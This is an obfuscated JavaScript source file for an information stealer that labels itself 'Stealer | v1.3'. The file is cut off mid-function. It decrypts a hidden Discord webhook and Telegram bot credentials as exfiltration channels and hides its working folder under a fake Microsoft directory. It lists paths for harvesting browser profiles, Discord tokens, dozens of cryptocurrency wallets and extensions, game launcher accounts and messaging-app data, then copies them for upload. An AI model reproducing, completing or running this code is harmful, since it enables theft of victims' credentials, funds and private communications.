const local = process.env.LOCALAPPDATA;
const locale = getLocale();
const VERSION = "v1.3";
const randStr = generateRandomString(12);
const active_nodes = [];
const folderIdx = process.argv.indexOf("--folder");
const fallback_conf = [];
const mainFolderName = folderIdx > -1 && process.argv[folderIdx + 1] ? process.argv[folderIdx + 1] : generateRandomString(10);
const globalSettingsPath = path.join("C:\\", "ProgramData", "Microsoft", "UserSettings");
const mainFolderPath = path.join(globalSettingsPath, mainFolderName, locale + "-" + computerName);
const globalLockFile = path.join(globalSettingsPath, "WinHost.lock");
const screenshotPath = path.join(mainFolderPath, "Screenshot", "screenshot.png");
var appdata = process.env.APPDATA;
var LOCAL = process.env.LOCALAPPDATA;
var localappdata = process.env.LOCALAPPDATA;
const atomicInjectionUrl = "";
const exodusInjectionUrl = "";
const _WH_D_ = "820168fa320612aa3b31b7bebb38af7512279f289a70f91e1cc797b2aa3ec3d647724ade81d02ae823fdd16b01b730d30a32677f00d0db999e17274f2cf30192c9b49ff7e410fb33f11b25fe1537c2abf857374a775b22de96d9035e3a65167df04277a0247401c2a388a57830ad18d34ed3c4f871caeb34dd487fbb48314f5b8215d555540eccf6a406c88ed1a5cb4224b94c4efc";
const _WH_K_ = "9b66512a8b33f32ec7ba1531a6338e2af2d6c7ff7e1f1c819ed9353ba371164c";
const _TBT_D_ = "";
const _TBT_K_ = "";
const _TCI_D_ = "";
const _TCI_K_ = "";
const discordWebhookUrl = function (a, g) {
  const h = {
    PiwOR: function (l, m) {
      return l(m);
    },
    UNrxG: "Upload to 0x0.st timed out.",
    JpAEN: function (l, m) {
      return l || m;
    },
    Zdqec: "hex",
    eGSvO: "aes-256-gcm",
    HGBAr: "utf8",
    ePdxC: function (l, m) {
      return l === m;
    },
    QyttB: "uLFRx"
  };
  if (h.JpAEN(!a, !g)) {
    return "";
  }
  try {
    var i = Buffer.from(a, h.Zdqec);
    var j = crypto.createDecipheriv(h.eGSvO, Buffer.from(g, h.Zdqec), i.slice(0, 12));
    j.setAuthTag(i.slice(12, 28));
    return j.update(i.slice(28), null, h.HGBAr) + j.final(h.HGBAr);
  } catch (l) {
    if (h.ePdxC("uLFRx", h.QyttB)) {
      return "";
    } else {
      h(i, "0x0st-Curl-Error");
      if (j.killed) {
        return h.PiwOR(g, new l(h.UNrxG));
      }
    }
  }
}(_WH_D_, _WH_K_);
const telegramBotToken = function (g, h) {
  if (!g || !h) {
    return "";
  }
  try {
    var l = Buffer.from(g, "hex");
    var m = crypto.createDecipheriv("aes-256-gcm", Buffer.from(h, "hex"), l.slice(0, 12));
    m.setAuthTag(l.slice(12, 28));
    return m.update(l.slice(28), null, "utf8") + m.final("utf8");
  } catch (n) {
    return "";
  }
}(_TBT_D_, _TBT_K_) || "REMPLACE_ME";
const telegramChatId = function (a, g) {
  if (!a || !g) {
    return "";
  }
  try {
    var i = Buffer.from(a, "hex");
    var j = crypto.createDecipheriv("aes-256-gcm", Buffer.from(g, "hex"), i.slice(0, 12));
    j.setAuthTag(i.slice(12, 28));
    return j.update(i.slice(28), null, "utf8") + j.final("utf8");
  } catch (m) {
    return "";
  }
}(_TCI_D_, _TCI_K_) || "REMPLACE_ME";
function checkSingleInstance() {
  try {
    if (!fs.existsSync(globalSettingsPath)) {
      fs.mkdirSync(globalSettingsPath, {
        recursive: true
      });
    }
    if (fs.existsSync(globalLockFile)) {
      const h = fs.readFileSync(globalLockFile, "utf8");
      try {
        process.kill(parseInt(h), 0);
        process.exit(0);
      } catch (j) {}
    }
    fs.writeFileSync(globalLockFile, process.pid.toString());
    process.on("exit", () => {
      try {
        fs.unlinkSync(globalLockFile);
      } catch (k) {}
    });
  } catch (k) {}
}
function generateRandomString(b) {
  const g = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let h = "";
  for (let j = 0; j < b; j++) {
    const l = Math.floor(Math.random() * g.length);
    h += g[l];
  }
  return h;
}
function decodeString(b) {
  return Buffer.from(b, "base64").toString("utf8");
}
const user = {
  ram: os.totalmem(),
  version: os.version(),
  uptime: os.uptime(),
  homedir: os.homedir(),
  hostname: os.hostname(),
  username: os.userInfo().username,
  type: os.type(),
  arch: os.arch(),
  release: os.release(),
  roaming: process.env.APPDATA,
  local: process.env.LOCALAPPDATA,
  temp: process.env.TEMP,
  countCore: os.cpus().length,
  sysDrive: process.env.SystemDrive,
  fileLoc: process.cwd(),
  randomUUID: crypto.randomBytes(16).toString("hex"),
  start: Date.now(),
  copyright: "<================[ Stealer | " + VERSION + " ]>================>\n\n",
  url: null,
  locale: locale
};
const b5 = {
  Bitcoin: process.env.APPDATA + "\\Bitcoin\\wallets",
  Zcash: process.env.APPDATA + "\\Zcash",
  Armory: process.env.APPDATA + "\\Armory",
  Bytecoin: process.env.APPDATA + "\\bytecoin",
  Jaxx: process.env.APPDATA + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb",
  Exodus: process.env.APPDATA + "\\Exodus\\exodus.wallet",
  Ethereum: process.env.APPDATA + "\\Ethereum\\keystore",
  Electrum: process.env.APPDATA + "\\Electrum\\wallets",
  AtomicWallet: process.env.APPDATA + "\\atomic\\Local Storage\\leveldb",
  Guarda: process.env.APPDATA + "\\Guarda\\Local Storage\\leveldb",
  Coinomi: process.env.APPDATA + "\\Coinomi\\Coinomi\\wallets"
};
const b8 = {
  browsers: [[user.local + "\\Google\\Chrome\\User Data\\Default\\", "Default", user.local + "\\Google\\Chrome\\User Data\\"], [user.local + "\\Google\\Chrome\\User Data\\Profile 1\\", "Profile_1", user.local + "\\Google\\Chrome\\User Data\\"], [user.local + "\\Google\\Chrome\\User Data\\Profile 2\\", "Profile_2", user.local + "\\Google\\Chrome\\User Data\\"], [user.local + "\\Google\\Chrome\\User Data\\Profile 3\\", "Profile_3", user.local + "\\Google\\Chrome\\User Data\\"], [user.local + "\\Google\\Chrome\\User Data\\Profile 4\\", "Profile_4", user.local + "\\Google\\Chrome\\User Data\\"], [user.local + "\\Google\\Chrome\\User Data\\Profile 5\\", "Profile_5", user.local + "\\Google\\Chrome\\User Data\\"], [user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\", "Default", user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\"], [user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\", "Profile_1", user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\"], [user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\", "Profile_2", user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\"], [user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\", "Profile_3", user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\"], [user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\", "Profile_4", user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\"], [user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\", "Profile_5", user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\"], [user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\", "Guest Profile", user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\"], [user.local + "\\Yandex\\YandexBrowser\\User Data\\Default\\", "Default", user.local + "\\Yandex\\YandexBrowser\\ User Data\\"], [user.local + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\", "Profile_1", user.local + "\\Yandex\\YandexBrowser\\User Data\\"], [user.local + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\", "Profile_2", user.local + "\\Yandex\\YandexBrowser\\User Data\\"], [user.local + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\", "Profile_3", user.local + "\\Yandex\\YandexBrowser\\User Data\\"], [user.local + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\", "Profile_4", user.local + "\\Yandex\\YandexBrowser\\User Data\\"], [user.local + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\", "Profile_5", user.local + "\\Yandex\\YandexBrowser\\User Data\\"], [user.local + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\", "Guest Profile", user.local + "\\Yandex\\YandexBrowser\\User Data\\"], [user.local + "\\Microsoft\\Edge\\User Data\\Default\\", "Default", user.local + "\\Microsoft\\Edge\\User Data\\"], [user.local + "\\Microsoft\\Edge\\User Data\\Profile 1\\", "Profile_1", user.local + "\\Microsoft\\Edge\\User Data\\"], [user.local + "\\Microsoft\\Edge\\User Data\\Profile 2\\", "Profile_2", user.local + "\\Microsoft\\Edge\\User Data\\"], [user.local + "\\Microsoft\\Edge\\User Data\\Profile 3\\", "Profile_3", user.local + "\\Microsoft\\Edge\\User Data\\"], [user.local + "\\Microsoft\\Edge\\User Data\\Profile 4\\", "Profile_4", user.local + "\\Microsoft\\Edge\\User Data\\"], [user.local + "\\Microsoft\\Edge\\User Data\\Profile 5\\", "Profile_5", user.local + "\\Microsoft\\Edge\\User Data\\"], [user.local + "\\Microsoft\\Edge\\User Data\\Guest Profile\\", "Guest Profile", user.local + "\\Microsoft\\Edge\\User Data\\"], [user.roaming + "\\Opera Software\\Opera Neon\\User Data\\Default\\", "Default", user.roaming + "\\Opera Software\\Opera Neon\\User Data\\"], [user.roaming + "\\Opera Software\\Opera Stable\\", "Default", user.roaming + "\\Opera Software\\Opera Stable\\"], [user.roaming + "\\Opera Software\\Opera GX Stable\\", "Default", user.roaming + "\\Opera Software\\Opera GX Stable\\"]],
  games: {
    NationsGlory: {
      "Local Storage": "AppData\\Roaming\\NationsGlory\\Local Storage\\leveldb"
    },
    "Riot Games": {
      Config: "AppData\\Local\\Riot Games\\Riot Client\\Config",
      Data: "AppData\\Local\\Riot Games\\Riot Client\\Data"
    },
    "Epic Games": {
      Settings: "AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini"
    },
    Uplay: {
      Settings: "AppData\\Local\\Ubisoft Game Launcher"
    },
    Minecraft: {
      "Microsoft Store": "AppData\\Roaming\\.minecraft\\launcher_accounts_microsoft_store.json",
      CheatBreakers: "AppData\\Roaming\\.minecraft\\cheatbreaker_accounts.json",
      "Rise (Intent)": "intentlauncher\\Rise\\alts.txt",
      TLauncher: "AppData\\Roaming\\.minecraft\\TlauncherProfiles.json",
      Paladium: "AppData\\Roaming\\paladium-group\\accounts.json",
      Novoline: "AppData\\Roaming\\.minecraft\\Novoline\\alts.novo",
      Badlion: "AppData\\Roaming\\Badlion Client\\accounts.json",
      Feather: "AppData\\Roaming\\.feather\\accounts.json",
      Impact: "AppData\\Roaming\\.minecraft\\Impact\\alts.json",
      Meteor: "AppData\\Roaming\\.minecraft\\meteor-client\\accounts.nbt",
      PolyMC: "AppData\\Roaming\\PolyMC\\accounts.json",
      PrismLauncher: "AppData\\Roaming\\PrismLauncher\\accounts.json",
      Intent: "intentlauncher\\launcherconfig",
      Lunar: ".lunarclient\\settings\\game\\accounts.json",
      Rise: "AppData\\Roaming\\.minecraft\\Rise\\alts.txt",
      "Launcher Accounts (Microsoft)": "AppData\\Roaming\\.minecraft\\launcher_accounts.json",
      "Launcher Profiles": "AppData\\Roaming\\.minecraft\\launcher_profiles.json",
      "Last Login": "AppData\\Roaming\\.minecraft\\lastlogin",
      Session: "AppData\\Roaming\\.minecraft\\session",
      "User Cache": "AppData\\Roaming\\.minecraft\\usercache.json",
      "Server List": "AppData\\Roaming\\.minecraft\\servers.dat",
      Stats: "AppData\\Roaming\\.minecraft\\stats",
      Saves: {
        path: "AppData\\Roaming\\.minecraft\\saves",
        excludes: ["region"]
      },
      Screenshots: "AppData\\Roaming\\.minecraft\\screenshots",
      Config: "AppData\\Roaming\\.minecraft\\config",
      "Minecraft Windows 10": {
        path: "AppData\\Local\\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang",
        excludes: ["region", "resource_packs", "behavior_packs", "minecraftPE"]
      }
    },
    PrismLauncher: {
      Accounts: "AppData\\Roaming\\PrismLauncher\\accounts.json",
      Instances: {
        path: "AppData\\Roaming\\PrismLauncher\\instances",
        excludes: ["region", "mods", "resourcepacks", "shaderpacks", ".minecraft", "logs"]
      },
      Metacache: "AppData\\Roaming\\PrismLauncher\\metacache",
      Config: "AppData\\Roaming\\PrismLauncher\\prismlauncher.cfg",
      Profiles: "AppData\\Roaming\\PrismLauncher\\profiles.json"
    },
    "Rockstar Games": {
      "Social Club": {
        path: "Documents\\Rockstar Games\\Social Club",
        excludes: ["Code Cache", "Cache", "Service Worker", "GPUCache", "DawnCache", "blob_storage"]
      }
    },
    "Electronic Arts": {
      "EA App": "AppData\\Local\\EA Desktop"
    },
    "GOG Galaxy": {
      Galaxy: {
        path: "Program Files (x86)\\GOG Galaxy",
        excludes: ["Games", "Dependencies", "redists"]
      }
    },
    "Battle.net": {
      "Battle.net": {
        path: "AppData\\Local\\Battle.net",
        excludes: ["Logs", "BrowserCache", "Cache"]
      }
    },
    Origin: {
      Origin: {
        path: "AppData\\Local\\Origin",
        excludes: ["Logs", "Cache"]
      }
    },
    Roblox: {
      Roblox: {
        path: "AppData\\Local\\Roblox",
        excludes: ["Versions", "Logs", "GlobalBasicSettings_13.xml"]
      }
    }
  },
  wallets: {
    Metamask: "Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
    Coinbase: "Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad",
    BinanceChain: "Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
    Phantom: "Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa",
    TronLink: "Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec",
    Ronin: "Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec",
    Exodus_Ext: "Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno",
    Coin98: "Local Extension Settings\\aeachknmefphepccionboohckonoeemg",
    Authenticator: "Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai",
    MathWallet: "Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc",
    YoroiWallet: "Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb",
    GuardaWallet: "Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln",
    JaxxxLiberty: "Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne",
    Wombat: "Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih",
    EVERWallet: "Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk",
    KardiaChain: "Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk",
    XDEFI: "Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf",
    Nami: "Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo",
    TerraStation: "Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp",
    MartianAptos: "Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk",
    TON: "Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd",
    Keplr: "Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap",
    CryptoCom: "Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj",
    PetraAptos: "Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci",
    OKX: "Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge",
    Sollet: "Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno",
    Sender: "Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg",
    Sui: "Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil",
    SuietSui: "Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd",
    Braavos: "Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma",
    FewchaMove: "Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj",
    EthosSui: "Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli",
    ArgentX: "Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb",
    NiftyWallet: "Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid",
    BraveWallet: "Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl",
    EqualWallet: "Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac",
    BitAppWallet: "Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi",
    iWallet: "Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj",
    AtomicWallet: "Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh",
    MewCx: "Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm",
    GuildWallet: "Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj",
    SaturnWallet: "Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig",
    HarmonyWallet: "Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib",
    PaliWallet: "Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn",
    BoltX: "Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca",
    LiqualityWallet: "Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn",
    MaiarDeFiWallet: "Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm",
    TempleWallet: "Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc",
    Metamask_E: "Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm",
    Ronin_E: "Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk",
    Yoroi_E: "Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb",
    Authenticator_E: "Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio",
    MetaMask_O: "Local Extension Settings\\djclckkglechooblngghdinmeemkbgci"
  },
  walletApps: b5,
  socials: {
    "Telegram Desktop": "AppData\\Roaming\\Telegram Desktop\\tdata",
    "WhatsApp Desktop": "AppData\\Roaming\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\\LocalState",
    "Signal Desktop": "AppData\\Roaming\\Signal\\databases",
    Purple: "AppData\\Roaming\\.purple",
    Tox: "AppData\\Roaming\\tox",
    Element: "AppData\\Roaming\\Element\\Local Storage",
    Skype: "AppData\\Roaming\\Microsoft\\Skype for Desktop\\Local Storage",
    "Facebook Messenger": "AppData\\Local\\Facebook\\Messenger",
    "Microsoft Teams": "AppData\\Local\\Microsoft Teams",
    Snapchat: "AppData\\Local\\Snapchat",
    Instagram: "AppData\\Local\\Instagram",
    Viber: "AppData\\Local\\Viber",
    Line: "AppData\\Local\\Line",
    WeChat: "AppData\\Local\\WeChat",
    Tumblr: "AppData\\Local\\Tumblr",
    ICQ: "AppData\\Local\\ICQ\\0001",
    Reddit: "AppData\\Local\\Reddit",
    Pinterest: "AppData\\Local\\Pinterest",
    Flock: "AppData\\Local\\Flock",
    Trello: "AppData\\Local\\Trello",
    Hangouts: "AppData\\Local\\Google\\Hangouts"
  },
  discord: [appdata + "\\discord\\", appdata + "\\discordcanary\\", appdata + "\\discordptb\\", appdata + "\\discorddevelopment\\", appdata + "\\lightcord\\", localappdata + "\\Google\\Chrome\\User Data\\Default\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 1\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 2\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 3\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 4\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 5\\", localappdata + "\\Google\\Chrome\\User Data\\Guest Profile\\", localappdata + "\\Google\\Chrome\\User Data\\Default\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 1\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 2\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 3\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 4\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 5\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Guest Profile\\Network\\", appdata + "\\Opera Software\\Opera Stable\\", appdata + "\\Opera Software\\Opera GX Stable\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\", localappdata + "\\Microsoft\\Edge\\User Data\\Default\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 1\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 2\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 3\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 4\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 5\\", localappdata + "\\Microsoft\\Edge\\User Data\\Guest Profile\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\"],
  processes: {
    "Google\\Chrome": "chrome.exe",
    "BraveSoftware\\Brave-Browser": "brave.exe",
    "Yandex\\YandexBrowser": "browser.exe",
    "Microsoft\\Edge": "msedge.exe",
    "Opera Software\\Opera Stable": "opera.exe",
    "Opera Software\\Opera GX Stable": "opera.exe",
    "Opera Software\\Opera Neon": "opera.exe"
  }
};
const PATHS = b8;
const browserPath = PATHS.browsers;
const gamesPaths = PATHS.games;
function getTimestamp() {
  const d = new Date();
  return d.toLocaleString("fr-FR", {
    timeZoneName: "short"
  });
}
function logError(b, c = "") {
  try {
    const g = getTimestamp();
    const h = "[" + g + "] [ERROR] " + c + ": " + (b.message || b) + "\nStack: " + (b.stack || "No stack trace") + "\n\n";
    console.error("[ERROR] " + c + ":", b);
    if (!mainFolderPath) {
      return;
    }
    if (!fs.existsSync(mainFolderPath)) {
      fs.mkdirSync(mainFolderPath, {
        recursive: true
      });
    }
    const j = path.join(mainFolderPath, "log.txt");
    fs.appendFileSync(j, h, "utf8");
  } catch (l) {
    console.error("[CRITICAL] Failed to write to log file:", l);
  }
}
function logSuccess(b) {
  try {
    const g = getTimestamp();
    const h = "[" + g + "] [SUCCESS] " + b + "\n";
    if (!mainFolderPath) {
      return;
    }
    if (!fs.existsSync(mainFolderPath)) {
      fs.mkdirSync(mainFolderPath, {
        recursive: true
      });
    }
    const j = path.join(mainFolderPath, "log.txt");
    fs.appendFileSync(j, h, "utf8");
  } catch (k) {}
}
function logInfo(c) {
  const d = {
    YKtdo: function (h, i) {
      return h !== i;
    },
    BoYRP: "fKNTW",
    aMRJl: "QZYRw",
    vHwgi: "log.txt",
    hZMNT: "utf8"
  };
  const g = d;
  try {
    if (g.YKtdo(g.BoYRP, g.aMRJl)) {
      const h = getTimestamp();
      const i = "[" + h + "] [INFO] " + c + "\n";
      if (!mainFolderPath) {
        return;
      }
      if (!fs.existsSync(mainFolderPath)) {
        fs.mkdirSync(mainFolderPath, {
          recursive: true
        });
      }
      const k = path.join(mainFolderPath, g.vHwgi);
      fs.appendFileSync(k, i, g.hZMNT);
    } else if (d.includes(g)) {
      return h;
    }
  } catch (m) {}
}
const MAX_ITEM_SIZE = 26214400;
const MAX_TEMPORARY_TOTAL_SIZE = 1073741824;
const FINAL_ARCHIVE_LIMIT = 104857600;
let globalCopiedSize = 0;
let globalLimitReached = false;
async function copyFolderRecursive(b, c, d = []) {
  const g = {
    SpFRE: function (h, i) {
      return h(i);
    },
    zZljJ: function (h, i) {
      return h(i);
    },
    idCzY: function (h, i) {
      return h + i;
    },
    DPLdT: function (h, i) {
      return h + i;
    },
    Ilufy: function (h, i, j) {
      return h(i, j);
    },
    IGhmP: "createZipArchiveCatbox",
    ORUHe: "kEaga",
    ZrEBC: "KBjnd",
    fgUOc: function (h, i) {
      return h !== i;
    },
    ZLIww: "aQljM",
    suNQQ: function (h, i) {
      return h !== i;
    },
    LNvPX: "khbzO",
    xwAzJ: "CmZaX",
    wNlNj: function (h, i) {
      return h !== i;
    },
    zCbSq: "eBahA",
    CZzmX: "UPXVe",
    UQzia: function (h, i, j, k) {
      return h(i, j, k);
    },
    aDFhO: "caZwf",
    MTPAA: function (h, i) {
      return h > i;
    },
    mYBYw: "VmdlN"
  };
  try {
    if (g.ORUHe === g.ZrEBC) {
      g.SpFRE(c, "[Skip] Directory copy not supported in copyFileIfExists: " + d);
      return false;
    } else {
      if (!fs.existsSync(c)) {
        if (g.fgUOc(g.ZLIww, "aQljM")) {
          if (h) {
            g.SpFRE(i, j);
          } else {
            g.zZljJ(k, l);
          }
        } else {
          await fs.promises.mkdir(c, {
            recursive: true
          });
        }
      }
      const i = await fs.promises.readdir(b);
      for (const l of i) {
        if (g.suNQQ(g.LNvPX, g.LNvPX)) {
          if (g) {
            const o = k.apply(l, arguments);
            m = null;
            return o;
          }
        } else {
          if (d.some(p => l.includes(p))) {
            continue;
          }
          const n = path.join(b, l);
          const o = path.join(c, l);
          try {
            if (g.xwAzJ === g.xwAzJ) {
              const p = await fs.promises.stat(n);
              if (p.isDirectory()) {
                if (g.wNlNj(g.zCbSq, g.CZzmX)) {
                  await g.UQzia(copyFolderRecursive, n, o, d);
                } else {
                  h += "\n━━━━━━━━━━━━━━━━[ " + i + " ]━━━━━━━━━━━━━━━━\n\n";
                  for (const r of m[n]) {
                    p += "  Host: " + r.host + "\n  Name: " + r.name + "\n  Value: " + r.value + "\n  Browser: " + r.browser + "\n  Expires: " + r.expiration + "\n  ────────────────────────────────\n";
                  }
                }
              } else if (g.aDFhO !== "vJmAx") {
                if (g.MTPAA(p.size, MAX_ITEM_SIZE)) {
                  if (g.mYBYw !== "LVOfh") {
                    continue;
                  } else {
                    const s = l.replace(/[^a-zA-Z0-9 ]/g, "");
                    const t = m.join(n, "Cards_[" + s + "].txt");
                    o.writeFileSync(t, g.idCzY(p.copyright, q.join("")), {
                      encoding: "utf8",
                      flag: "w"
                    });
                    r += g.DPLdT("[ " + s + " ]\n" + t.join(""), "\n");
                  }
                }
                await fs.promises.copyFile(n, o);
              } else {
                const t = {
                  browser: "" + h,
                  token: i
                };
                g.push(t);
                j++;
              }
            } else {
              g.Ilufy(g, h, g.IGhmP);
              i(j);
            }
          } catch (u) {}
        }
      }
    }
  } catch (v) {}
}
function copyFileIfExists(b, c, d = null, g = [], h = null) {
  const i = {
    gPbeI: function (k, l) {
      return k + l;
    },
    Qswcb: "utf8",
    RNFcc: "aes-256-gcm",
    LKtel: "jWNfE",
    gzBxS: "cUliP",
    cvykc: "SOdwM",
    TEXeC: function (k, l) {
      return k(l);
    },
    QaCFa: function (k, l) {
      return k !== l;
    },
    wCotY: "LeVAB",
    RygAo: function (k, l) {
      return k || l;
    },
    IqFGA: function (k, l) {
      return k > l;
    },
    UObXd: "mxehi",
    BWVzq: function (k, l) {
      return k(l);
    }
  };
  if (!fs.existsSync(b)) {
    return false;
  }
  if (!fs.existsSync(c)) {
    fs.mkdirSync(c, {
      recursive: true
    });
  }
  const j = d ? path.join(c, d) : path.join(c, path.basename(b));
  try {
    if (i.LKtel === i.gzBxS) {
      b.push(null);
    } else if (fs.lstatSync(b).isDirectory()) {
      if (i.cvykc === i.cvykc) {
        i.TEXeC(logInfo, "[Skip] Directory copy not supported in copyFileIfExists: " + b);
        return false;
      } else {
        c.rmSync(d, {
          recursive: true,
          force: true
        });
      }
    } else if (i.QaCFa("Mowcn", i.wCotY)) {
      const n = fs.statSync(b);
      const o = i.RygAo(h, MAX_ITEM_SIZE);
